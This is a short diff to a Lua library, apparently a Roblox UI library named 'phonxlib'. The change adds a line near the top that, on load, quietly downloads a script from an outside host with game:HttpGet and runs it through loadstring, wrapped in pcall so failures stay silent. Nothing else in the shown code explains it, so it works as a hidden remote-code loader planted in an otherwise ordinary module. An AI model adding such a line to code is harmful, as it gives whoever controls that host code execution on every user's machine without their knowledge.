@@ -1,5 +1,5 @@
 local lib = {}
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 function lib:start(tname_lib)
     
 if not game.CoreGui:FindFirstChild("phonxlib") then
